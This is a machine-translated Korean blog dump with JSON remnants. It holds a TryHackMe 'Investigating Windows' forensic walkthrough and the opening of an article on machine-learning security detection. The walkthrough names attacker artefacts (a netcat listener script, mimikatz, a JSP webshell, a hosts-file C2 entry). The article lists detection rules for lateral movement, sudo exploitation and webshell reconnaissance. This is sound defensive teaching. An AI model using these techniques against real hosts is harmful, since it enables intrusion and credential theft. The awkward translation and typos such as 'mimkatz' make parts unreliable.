5:48:32 PM\n\n## 시스템이 처음 시작될 때 어떤 IP에 연결하나요?\n\n<div class=\"content-ad\"></div>\n\n## 방법:\n\n답이 호스트 파일에 있는지 확인해보려면 호스트 파일을 살펴보세요. 파일 경로는 C:\\ ` Windows ` System32 ` drivers ` 등입니다. 이 폴더 안에 들어가면 호스트 파일을 더블 클릭하세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_14.png)\n\n호스트를 더블 클릭하여 열면 파일을 열 어떻게 할지를 물어보는 창이 나타납니다. 메모장을 클릭하세요.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_15.png)\n\n파일 안에서 무언가 이상한 점이 보입니다. 먼저, 많은 사이트들이 로컬 호스트를 가리키고 있고, 두 번째로 구글이 여기에 있습니다. DNS 독립을 시도하고 있는 것으로 보입니다. 백업 파일을 가지고 있거나 이전 상태로 되돌릴 수 있다면, 반드시 알 수 있을 것입니다. 레지스트리로 이동하여 이 부팅 프로그램이 어디에 연결되어 있는지 확인해보아야 할 것입니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_16.png)\n\n이제 원격 데스크톱에서 Windows 키를 누르거나 시작 메뉴 아이콘을 클릭하세요. 단순히 regedit를 입력하면 결과가 하나만 표시됩니다. 해당 항목을 클릭하거나 Enter를 눌러주세요.\n\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_17.png)\n\n레지스트리 편집기 창이 나타납니다. 다음 경로를 따르세요. HKEY_LOCAL_MACHINE ` SOFTWARE ` Microsoft ` Windows ` CurrentVersion ` Run. 해당 위치에 도착하면 두 개의 값이 표시됩니다. UpdateSvc를 확인하면 원격 머신이 시작될 때 연결하는 IP 주소가 나타납니다.\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_18.png)\n\n답변: 10.34.2.3\n\n\n<div class=\"content-ad\"></div>\n\n## 어드민 권한을 갖고 있는 두 개의 계정은 무엇인가요?\n\n답변 형식: username1, username2\n\n## 방법:\n\n관리자 그룹에 속한 사용자를 확인하려면 다음 명령을 사용할 수 있습니다. Get-LocalGroupMember -Group “Administrators”. 명령을 실행하려면 enter 키를 누르세요. 출력에서 정답을 확인할 수 있습니다. 정답을 얻기 위해 사용자를 변경해야 할 수도 있어요(저는 그랬어요).\n\n<div class=\"content-ad\"></div>\n\n아래는 Markdown 형식으로 변환한 내용입니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_19.png)\n\n답변: Jenny, Guest\n\n## 악성 스케줄된 태스크의 이름은 무엇인가요?\n\n## 방법:\n\n<div class=\"content-ad\"></div>\n\n이 시스템에서 예약된 작업이 무엇인지 확인해 봅시다. 이를 위해 Get-ScheduledTask 명령을 사용하세요. 명령을 실행하려면 Enter 키를 누르세요.\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_20.png)\n\n예약된 많은 작업들을 확인할 수 있습니다. 이 목록을 좀 더 작게 만들어 봅시다. 이를 위해 Get-Scheduled | where '$_.TaskPath -eq “\\”' 명령을 실행할 수 있습니다. 이 명령은 '\\' TaskPath를 가진 것만 출력하며, 목록을 여섯 개로 줄일 수 있습니다. 이 프로그램 중 하나가 악성인데, 그것이 무엇인지 찾을 수 있나요?\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_21.png)\n\n<div class=\"content-ad\"></div>\n\n답변: 파일 시스템 정리\n\n## 해당 작업은 매일 실행하려고 했던 파일은 무엇인가요?\n\n## 방법:\n\n명령을 $task에 대입하려면 다음 명령을 사용합니다. $task = Get-ScheduledTask | Where TaskName -EQ \"Clean file system\"을 입력하세요.\n\n<div class=\"content-ad\"></div>\n\n\n![Screenshot](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_22.png)\n\nNow we can run the command `$task.Actions` to see what will execute when we run this program. Press enter to run the command, and get your answer.\n\n![Screenshot](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_23.png)\n\nAnswer: nc.ps1\n\n\n<div class=\"content-ad\"></div>\n\n## 이 파일이 로컬로 수신 대기하는 포트는 무엇입니까?\n\n## 방법:\n\n이 답변을 보려면 이전 질문의 출력을 확인하고 포트는 그 위에 있는데, Arguments 열에 있습니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_24.png)\n\n<div class=\"content-ad\"></div>\n\nAnswer: 1348\n\n## 제니가 마지막으로 로그인한 시간은 언제였나요?\n\n## 방법:\n\n우리는 이 명령어를 이전에 실행했었지만, 정보를 다시 가져오기 위해 다시 실행할 수 있습니다. 명령어는 net user Jenny | findstr \"Last\" 입니다. 명령어를 실행하고 이 질문에 대한 답변을 얻으려면 엔터를 누르세요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_25.png\" />\n\n대답: Never\n\n## 언제 침해가 발생했나요?\n\n대답 형식: MM/DD/YYYY\n\n<div class=\"content-ad\"></div>\n\n## 방법:\n\n태스크 바에서 파일 탐색기 아이콘을 클릭하여 파일 탐색기를 엽니다. 창이 나타나면 로컬 디스크(C:)를 클릭하십시오.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_26.png)\n\n이제 C 폴더 안에 있게 될 텐데, 폴더를 보면 눈에 띄는 날짜가 있을 것입니다. 여기에 속하지 않는 폴더도 보일 것입니다. 여러 번 나타나는 날짜가 정답입니다. THM으로 답을 입력할 때 월과 일 앞에는 0을 넣으십시오.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_27.png)\n\n답변: 03/02/2019\n\n## Windows가 새로운 로그온에 처음으로 특권을 할당한 시간은 언제입니까?\n\n답변 형식: MM/DD/YYYY HH:MM:SS AM/PM\n\n\n<div class=\"content-ad\"></div>\n\n## 방법:\n\n시작 메뉴 아이콘에 가서 클릭한 후 팝업 메뉴에서 '이벤트 뷰어(Event Viewer)'를 클릭합니다.\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_28.png)\n\n우리가 찾고 있는 것은 보안 문제이므로 일단 보안 로그를 먼저 살펴보고 원하는 내용을 찾을 수 있는지 확인해야 합니다. 그러나 많은 로그가 있을 것을 알기 때문에 로그를 좁혀야 합니다. 이를 위해 이벤트 뷰어 창의 오른쪽에 있는 '사용자 지정 보기 만들기(Create Custom View)'를 클릭합니다.\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_29.png)\n\n팝업 창이 나타납니다. 먼저 'Logged' 필드를 클릭하면 드롭다운 상자가 나타납니다. 'Custom Range...'을 클릭하세요.\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_30.png)\n\n'From:' 섹션에서 'First Event'라고 써 있는 곳을 클릭한 다음 드롭다운 메뉴에서 'Events On'을 클릭하세요. 'To:' 섹션에서도 동일한 작업을 수행하세요.\n\n\n<div class=\"content-ad\"></div>\n\n<pre>\n<img src=\"/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_31.png\" />\n\n이전 질문에서 우리는 날짜가 2019년 3월 2일임을 알고 있으므로 해당 날짜를 입력할 수 있습니다. 마지막 질문에서 공격이 일어난 대략적인 시간을 알고 있으므로, 오후 4:00:00부터 4:30:00까지 입력할 수 있습니다. 날짜 필드를 채우고 나면 창의 아래쪽에 있는 OK 버튼을 클릭하세요.\n\n<img src=\"/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_32.png\" />\n\n이제 살펴볼 로그를 선택해야 합니다. 이를 위해 Event Logs: 필드를 클릭한 후, 드롭다운이 나타나면 Windows Logs 옆의 작은 +를 클릭한 후 마지막으로 Security를 클릭하세요. 이것으로 해당 로그가 선택됩니다.\n</pre>\n\n<div class=\"content-ad\"></div>\n\n아래의 명령을 Markdown 형식으로 변경하실 수 있습니다.\n\n\n![이미지 설명](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_33.png)\n\n[사용자 정의 보기 창 하단에 있는 OK 버튼을 클릭하십시오.](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_34.png)\n\n필터를 저장할 수 있는 창이 나타납니다. 이름을 지정하라는 요청이 있을 텐데, 창 오른쪽에 있는 OK 버튼을 클릭하십시오.\n\n\n<div class=\"content-ad\"></div>\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_35.png)\n\n우리는 살펴볼 이벤트가 297개 있어요. 처음부터 시작해 봐요. 이벤트 갯수 오른쪽에 있는 밑으로 스크롤해서 맨 밑으로 가세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_36.png)\n\n맨 밑으로 가면 천천히 스크롤을 올려가면서 Task Category를 살펴보세요. 이것은 우리가 찾는 것, 즉 새로운 로그인에 대한 권한 변경을 나타냅니다. 보안 그룹 관리를 찾아보세요. 찾으시면 정답에 대한 날짜와 시간을 확인하세요. 답변에 월과 일 앞에 0을 넣는 것을 잊지 마세요.\n\n<div class=\"content-ad\"></div>\n\n아래의 마크다운 형식으로 표 태그를 변경해주세요.\n\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_37.png)\n\nAnswer: 03/02/2019 4:04:47 PM\n\n## Windows 암호를 가져 오는 데 사용 된 도구는 무엇입니까?\n\n## 방법: \n\n\n<div class=\"content-ad\"></div>\n\n명령 프롬프트가 계속해서 C:\\TMP\\mim.exe로 나타납니다. 가능한 도구를 확인할 수 있는 장소입니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_38.png)\n\n화면 하단의 작업 표시줄에 있는 파일 탐색기 아이콘을 클릭하세요. 파일 탐색기 창이 나타나면 로컬 디스크 (C:)를 클릭하여 이 디렉터리를 열어보세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_39.png)\n\n<div class=\"content-ad\"></div>\n\nTMP 디렉토리를 두 번 클릭해주세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_40.png)\n\n이 디렉토리 안으로 들어가면 여러 파일, 워드 문서 및 파워셸 명령이 있을 거에요. 우리가 계속 보던 mim.exe라는 애플리케이션을 찾아보면 그 아래에 mim-out이라는 워드 문서가 있어요. 이것은 해당 애플리케이션과 관련이 있을 수 있으니 열어봅시다. mim-out을 더블클릭해주세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_41.png)\n\n<div class=\"content-ad\"></div>\n\nWhen mim-out 오픈시, 알고 있어야 할 도구 이름이 나타날 것입니다.\n\n![도구 이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_42.png)\n\n답변: mimkatz\n\n## 공격자의 외부 제어 및 명령 서버 IP 주소는 무엇이었습니까?\n\n<div class=\"content-ad\"></div>\n\n## 어떻게:\n\n이제 호스트 파일로 돌아가 봅시다. 디렉토리 경로 필드 옆의 위쪽 화살표를 클릭하면 한 단계 위로 이동할 수 있어요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_43.png)\n\n호스트 파일에 도착하려면 이 파일 경로를 따라가세요: C:\\ ` Windows ` System32 ` drivers ` 등등. 거기에 도착하면 hosts를 두 번 클릭하여 열어보세요.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_44.png)\n\n여기에 파일을 열 방법을 물어보는 창이 표시됩니다. 노트패드를 클릭하세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_45.png)\n\n이 파일 안에 google.com과 www.google.com이 있다는 것을 볼 수 있습니다. 이는 호스트 파일에 입력해야 할 필요가 없는데 PC가 DNS 서버로 이동하여 찾을 수 있기 때문에 매우 의심스럽습니다. 위협 요소가 C2 서버 IP를 이 방식으로 숨길 수 있습니다. 호스트 머신에서 명령 프롬프트를 열어 Google.com에 핑을 보내어 호스트 파일과 일치하는 경우에는 합법적인 것이고, 그렇지 않으면 의심스러울 수 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n![TryHackMeInvestigatingWindowsTask1InvestigatingWindows_46](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_46.png)\n\n호스트 파일과 일치하지 않습니다. 이는 대부분 C2 서버 IP입니다. 이것을 TryHackMe에 답으로 입력하세요. 또 다른 답변에 필요한 것이 있기 때문에 이 파일을 열어 둡니다.\n\n![TryHackMeInvestigatingWindowsTask1InvestigatingWindows_47](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_47.png)\n\n답변: 76.32.97.132\n\n<div class=\"content-ad\"></div>\n\n## 서버 웹 사이트를 통해 업로드 된 쉘의 확장자 이름이 무엇이었습니까?\n\n## 방법:\n\n이제 우리는 또 다른 수상한 디렉토리를 확인할 것입니다. 파일 탐색기 창으로 돌아가면 창의 왼쪽에 빠른 링크 섹션이 있습니다. 여러 디렉토리에 빠르게 액세스할 수 있습니다. Local Disk (C:)를 찾아보세요. 그 아래에 우리가 찾는 디렉토리가 있어야 합니다. inetpub인데요, 해당 디렉토리로 바로 이동해보세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_48.png)\n\n<div class=\"content-ad\"></div>\n\n이 디렉터리 안에는 wwwroot라는 다른 디렉터리가 있습니다. 이 디렉터리로 이동하려면 클릭하세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_49.png)\n\n이제 이 디렉터리 안에서 세 개의 파일을 볼 수 있습니다. 두 개는 .JSP 파일이고 다른 하나는 .GIF 파일입니다. .GIF 파일은 컴퓨터에서 매우 의심스럽지 않지만 .JSP 파일은 무엇인가요? 빠른 구글 검색으로 알아냅니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_50.png)\n\n<div class=\"content-ad\"></div>\n\n이 자바 파일이 여기에 무엇을 하고 있는 건가요? 우리가 찾고 있는 파일 확장자일 수도 있어 보여요. 질문에는 업로드된 셸의 확장자가 무엇인지 물었지만, 그들은 두 개의 다른 파일에 대해 이야기하고 있어요.\n\n이미지:\n\n![tryhackme image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_51.png)\n\n답변: .jsp\n\n## 공격자가 마지막으로 열었던 포트는 무엇이었나요?\n\n<div class=\"content-ad\"></div>\n\n## 사용 방법:\n\n개방된 포트에 대해 알아보는 좋은 방법은 방화벽 로그를 확인하는 것입니다. 이를 확인하려면 화면 왼쪽 하단의 시작 아이콘을 클릭한 다음 방화벽이라고 입력한 후에 유일한 항목을 클릭하거나 Enter를 누릅니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_52.png)\n\nWindows 방화벽 및 고급 보안 창이 나타납니다. 나타날 경우 좌측에 있는 Inbound Rules를 클릭합니다. 이 과정에서 많은 인바운드 규칙이 표시됩니다.\n\n<div class=\"content-ad\"></div>\n\n아래는 우리가 찾고 있는 것을 찾기 위해 대부분을 필터링하겠습니다. 오른쪽 열로 이동하세요. 그룹으로 필터링을 클릭한 다음, 드롭다운 메뉴 아래쪽으로 스크롤하여 그룹이 없는 규칙을 클릭하세요.\n\n이제 결과가 두 개만 표시될 것입니다. 하나는 매우 의심스러워 보입니다. 첫 번째 항목인 개발용 외부 연결 허용을 두 번 클릭하세요.\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_55.png)\n\nA window will pop-up giving details about this rule, look for the tab labeled Protocols and Ports and click on it.\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_56.png)\n\nNow in here you will see the port that is opened, this is the answer to the question.\n\n\n<div class=\"content-ad\"></div>\n\n테이블 태그를 Markdown 형식으로 변경하세요.\n\n<div class=\"content-ad\"></div>\n\n호스트 파일로 돌아가주세요. 만약 위의 지침에 따라 호스트 파일에 들어가지 않았다면요. 내가 이전에 말했던, dns 서버에서 쉽게 찾을 수 있는 특정 웹 사이트가 호스트 파일에 있는 것에 대해 기억하시나요? 같은 웹 사이트가 C2 서버에 연결되어 있다는 것이 이 질문의 답입니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_58.png)\n\n이렇게해서 이 방을 모두 끝내셨어요!!! 축하해요!!!!!! 마지막으로, 질문들이 여러 섹션을 왔다갔다하게 만들어서 그렇게 좋아하지 않았어요. 여러분은 몇 가지 추적을 계속하고 싶었지만, 질문들이 다른 방향으로 이끌었거든요. 그러니 이 방을 하실 때, 질문을 순서대로 해야한다는 제한은 없다고 기억해주세요. 도움이 되었기를 바래요. 감사합니다!!!","ogImage":{"url":"/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_0.png"},"coverImage":"/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_0.png","tag":["Tech"],"readingTime":16},{"title":"AI-주도 보안 운영 구조에서 낮은 거짓 양성률을 유지하는 방법","description":"","date":"2024-05-20 18:11","slug":"2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate","content":"\n\n## 이 기사는 사이버 보안에 적용된 제품 준비 단계의 기계 학습 솔루션 구축에 대한 마인드셋을 논의합니다.\n\n![이미지](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png)\n\n지난 몇 년간, 우리가 수십 년 동안 사용해온 교육 시스템의 품위를 훼손하는 LLMs가 존재하고, AGI로부터 실재적인 공포를 느끼기 시작했음에도 불구하고, 인공 지능(AI) 시스템을 새로운 데이터 과학 도메인에 적용하는 가능성은 먼산 미래적 이정표를 달성하기 어렵고 구별되는 접근이 필요합니다.\n\n이 기사에서는 사이버 보안에 대한 AI 적용 가능성, 대부분의 응용 프로그램이 실패하는 이유, 그리고 실제로 작동하는 방법론에 대해 개념적으로 논의합니다. 가정적으로, 제시된 접근 방식과 결론은 특히 시스템 로그로부터의 추론에 의존하는 낮은 잘못된 양성 요구 사항을 갖는 기타 응용 도메인으로 이전 가능합니다.\n\n<div class=\"content-ad\"></div>\n\n정보 보안에 관련된 데이터에 머신 러닝(ML) 로직을 구현하는 방법은 다루지 않을 것입니다. 이미 다음 기사에서 코드 샘플과 함께 기능적인 구현 방법을 제공했습니다:\n\n- 기업 보안 텔레미터의 Power Law 분포를 기반으로 한 이상 징후 탐지 엔지니어링;\n- 리눅스 auditd 로그에서 TF-IDF 및 해시 인코딩으로 침입 탐지하는 셸 언어 처리;\n- 시스템 로그에 대한 GPT와 유사한 모델 엔지니어링 기술 중 어떤 것이 작동하는가?\n\n# 서명\n\n아직도 성숙한 보안 자세의 근간이자 가장 가치 있는 구성 요소는 목표로 하는 시그니처 규칙뿐입니다. 아래에 예시로 나오는 휴리스틱은 우리 방어의 중요한 부분입니다:\n\n<div class=\"content-ad\"></div>\n\n```js\nparent_process == \"wmiprvse.exe\"\n&& \nprocess == \"cmd.exe\"\n&& \ncommand_includes (\\\\127.0.0.1\\ADMIN)\n```\n\n정말이지, 이런 규칙들은 훌륭합니다. 이것은 레드 캐너리가 WMI를 통한 측면 이동 탐지를 위해 impacket과 같은 도구를 사용하여 실현할 수 있는 (간단화된) 논리의 예시일 뿐입니다. 이런 규칙을 절대 끄지 마시고 계속해서 추가해 나가세요!\n\n하지만, 이 방법론에는 결함이 있습니다...\n\n그래서 이러한 이유로 누구나 한번씩은 매직한 \"머신 러닝\"을 통해 보안 문제를 해결해 주는 솔루션에 자본, 인력, 시간 등의 자원을 투자하는 것입니다. 보통 이것은 투자 대비 수익이 낮은 토끼굴로 보입니다: (1) 보안 분석가들의 대시보드가 크리스마스 트리처럼 빛나게 되고, 상기 그림 1을 고려하세요; (2) 분석가들이 경보 피로를 느끼게 됩니다; (3) 머신 러닝 휴리스틱이 비활성화되거나 무시됩니다.\n\n\n<div class=\"content-ad\"></div>\n\n# 일반적 vs. 특정 휴리스틱\n\n먼저 좁은 지능과 일반적 지능의 개념에 주의를 기울이고 싶습니다. 이는 직접적으로 보안 휴리스틱에 옮겨집니다.\n\n일반적으로, 지능은 목표를 달성하는 능력입니다. 우리는 \"일반화\"하고, 달성해야 할 목표에 도달하기 위해 자연선택과 유전적 인섈트에 의해 주도되는 환경에서는 결코 필요하지 않은 목표를 달성할 수 있는 능력을 갖고 있다고 여겨집니다.\n\n일반화가 우리 종족이 세계를 정복할 수 있게 해 줬지만, 일련의 작업에서 우리보다 훨씬 뛰어난 존재들이 있습니다. 예를 들어, 계산기는 폰 노이만 같은 우리보다 똑똑한 사람이 할 수 있는 산술보다 훨씬 더 잘 할 수 있으며, 다람쥐들 (!)은 작년에 숨겨둔 도토리의 위치를 기억하는 데 사람보다 훨씬 뛰어날 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n\n![Architecture of AI-Driven Security Operations with a Low False Positive Rate](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_1.png)\n\n보안 휴리스틱에 대해 이야기할 수 있습니다. 특정 도구나 CVE에 중점을 둔 규칙들과 더 넓은 기법 집합을 감지하려는 규칙들이 있습니다. 예를 들어, CVE-2019–14287을 악용한 sudo 권한 상승에만 집중한 이 감지 로직을 살펴봅시다.\n\n```js\nCommandLine|contains: ' -u#'\n```\n\n반면에, 웹쉘 감지 규칙(가려진 형태로 복제됨)은 상당히 넓은 논리를 구현하려고 시도합니다.\n\n\n<div class=\"content-ad\"></div>\n\n\nParentImage|endswith:\n - '/httpd'\n - '/nginx'\n - '/apache2'\n...\n\n&&\nImage|endswith:\n - '/whoami'\n - '/ifconfig'\n - '/netstat'\n\n\n보안 위협을 시각화하기 위해 감지 규칙을 공격적 기법, 도구 및 절차(TTP)의 랜드스케이프에 매핑하는 더 세밀한 행위 휴리스틱을 정의합니다. 위에 있는 인텔리전스 랜드스케이프와 유사하게, 다음과 같이 선언 규칙을 공격적 기법, 도구 및 절차(TTPs)의 랜드스케이프에 매핑하여 보안 포지션을 시각화할 수 있습니다:\n\n<img src=\"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_2.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n# False-Positives vs. False-Negatives\n\n슈도 CVE 규칙은 특정 기술 하나만 감지하고 다른 것을 놓치므로 (극히 높은 거짓 부정률) 거짓 음성 비율이 매우 높습니다. 반면에 웹 쉘 규칙은 Kali Linux 아카이브의 공격 기술 및 웹 쉘 도구 세트를 감지할 수 있습니다.\n\n명백한 질문은 - 그렇다면, 왜 우리는 여러 넓은 행동 규칙으로 모든 가능한 TTP를 다루지 않는 것일까요?\n\n왜냐하면 그것들은 거짓 양성을 가져오기 때문입니다... 정말 많이요.\n\n<div class=\"content-ad\"></div>\n\n여기서는 잘못된 긍정 대 잘못된 부정의 트레이드 오프를 관찰합니다.\n\n대부분의 기관은 sudo CVE 규칙을 복사하여 SIEM에서 즉시 활성화할 수 있지만, 웹쉘 규칙은 보안 분석가가 환경에서 관찰된 모든 합법적인 트리거를 걸러내는 동안 \"모니터 전용\" 모드로 작동할 수 있습니다.\n\n시스템 관리자가 생성한 자동화 알림을 볼 수 있습니다. 이 알림은 REST API 요청을 실행하고 열거 액션 중 하나를 트리거하는지 또는 배포될 때 이상한 부모-자식 프로세스 관계를 만드는 Ansible 셸 스크립트를 실행합니다. 결국 광범위한 행동 규칙이 열 두 가지 제외와 한 달에 두 번 이상의 수정을 통해 목록으로 전환되는 것을 관찰했습니다. 그래서 보안 엔지니어는 규칙의 범위 사이에서 균형을 유지합니다. 일반화의 확대는 비용이 많이든다는 것과 잘못된 긍정의 비율을 최소화하려고 노력합니다.\n\n# 보안 휴리스틱으로서의 기계 학습 실패\n\n<div class=\"content-ad\"></div>\n\n여기 보안 전문가들이 행동 휴리스틱을 구현하는 대체 기술을 찾기 시작합니다. 머신러닝 구현의 요구 사항은 선행적으로 넓습니다. 머신러닝 알고리즘의 적용 가능성을 고려할 때 대부분의 경우 보안 전문가들의 직관은 비지도 학습으로 이끕니다. 우리는 AI에게 네트워크에서 이상을 감지하고, 이상한 명령 라인에 대해 경고하는 등의 작업을 요청합니다. 이러한 작업은 \"나를 위해 보안을 해결해줘\"라는 일반화 수준에 있습니다. 생산에서 잘 작동하지 않는 것이 놀라운 부분입니다.\n\n실제로 많은 경우 ML은 정확히 우리가 요청한 대로 수행합니다. 예를 들어 IntelliJ가 자신을 업데이트하는 데 사용하는 이상한 elevator.exe 이진 파일을 보고할 수도 있으며, Spotify가 업데이트를 위해 사용하는 새로운 CDN에 대한 경고 또한 동일하게 Command and Control 콜백과 똑같이 랜덤하게 지연될 수 있습니다. 그리고 그 날에 이상했던 수백 가지 유사한 행동들.\n\n감독 학습의 경우에는 대규모의 레이블이 지정된 데이터 집합을 구성할 수 있는 경우(예: 악성 코드 탐지), EMBER와 같이 일반화가 잘 되는 모델링 체계를 구축할 수 있습니다.\n\n그러나 이러한 솔루션들에서도 — 정보 보안의 현대적인 AI 모델조차 아직 \"회색\" 영역을 파악하기에 충분한 컨텍스트를 보유하고 있지 않습니다. 예를 들어, TeamViewer를 나쁜 것인지 좋은 것인지 고려해야 하는가? 많은 중소기업이 저렴한 VPN으로 사용하고 있습니다. 동시에 이러한 소규모 기업 중 일부는 이러한 도구를 사용하여 대상 네트워크에 백도어로 접근하는 랜섬웨어 그룹일 수도 있습니다.\n\n<div class=\"content-ad\"></div>\n\n# 머신 러닝이 보안 휴리스틱으로 성공한 사례\n\nML 기반 휴리스틱은 rule-based detection과 같은 이념을 따라야 합니다. 악의적인 TTP 집합에 초점을 맞추어야 합니다. 보안에 AI를 적용하려면 실제로 보안에 대한 지식과 직관이 필요하며, 데이터 과학자분들께 죄송하지만요. ¯\\_(ツ)_/¯ 적어도 오늘날에는 LLM이 다른 많은 작업에 이어 해결할 수 있는 폭넓은 일반화를 달성할 때까지 보안 문제를 해결할 수 있습니다.\n\n예를 들어, 명령줄에서 이상을 요청하는 대신 (이에 관한 결과가 이 글의 상단 그림 1에 표시된 것처럼 겸손한 크기의 데이터셋에서 634개의 이상으로 나타나는 것), 특정 공격 기법 주변의 베이스라인을 벗어난 활동을 요청해보세요. 즉, 이상한 Python 실행 (T1059.006)을 요청하고 바로 알아내세요! – 동일한 ML 알고리즘, 전처리 및 모델링 기술에 따르면, 실제로 Python 반전 셸인 유일한 이상을 발견할 수 있습니다:\n\n![image](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_3.png)\n\n<div class=\"content-ad\"></div>\n\nUnix에 중점을 둔 비지도 학습 기법 예시:\n\n- 이상한 python/perl/ruby 프로세스 (스크립팅 인터프리터를 통한 실행, T1059.006);\n- 이상한 systemd 명령어 (systemd 프로세스를 통한 영속성, T1543.002);\n- 고 심각도 점프박스로의 이상한 ssh 로그인 출처 (T1021.004).\n\nWindows에 중점을 둔 비지도 학습 기법 예시:\n\n- 도메인 컨트롤러, MSSQL 서버에 로그인한 사용자의 이상 (T1021.002);\n- NTDLL.DLL을 로드하는 이상한 프로세스 (T1129);\n- 이상한 RDP 클라이언트 및 서버 조합과의 네트워크 연결 (T1021.001).\n\n<div class=\"content-ad\"></div>\n\n기능적인 지도 학습 기준 예시:\n\n- Reverse shell 모델: 알려진 방법을 활용하여 데이터셋의 악성 부분을 생성하십시오 (이와 같은 생성기에서 영감을 받으세요); 환경 텔레메트리에서 프로세스 생성 이벤트를 사용하여 데이터셋의 합법적인 대응물로 활용하십시오.\n- 강력한 속임수에 대한 규칙을 머릿속에 만드는 대신, 아래의 그림 5에 나온 것과 같이 속임수에 대한 견고성을 고려한 별도의 기계 학습 모델을 구축하십시오 (스포일러: 성공할 수 없습니다). Mandiant의 이 주제에 대한 좋은 기사가 있습니다.\n\n![이미지](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_4.png)\n\n# 기계 학습은 서명 논리의 확장입니다\n\n<div class=\"content-ad\"></div>\n\n위의 예시들을 체계적으로 정리하면, ML 휴리스틱을 성공적으로 적용하는 데에는 다음 두 단계가 포함됩니다:\n\n- 특정 TTP에서 생성된 텔레메트리를 가능한 정확하게 포착할 수 있도록 입력 데이터를 좁힌 후;\n- 비정상 활동을 찾기 위해 가능한 한 적은 차원을 정의합니다 (예: 프로세스 이미지만 볼 수 있는 논리는 부모 프로세스 이미지와 프로세스 인수를 추가로 볼 때보다 경보를 적게 발생시킵니다).\n\n위의 단계 1은 사실 시그니처 규칙을 생성하는 방법입니다.\n\n웹 셸 규칙을 활성화하기 전 \"보안 분석가들이 환경을 대표하는 모든 트리거를 걸러낸다\"고 이전에 얘기한 것을 기억하나요? 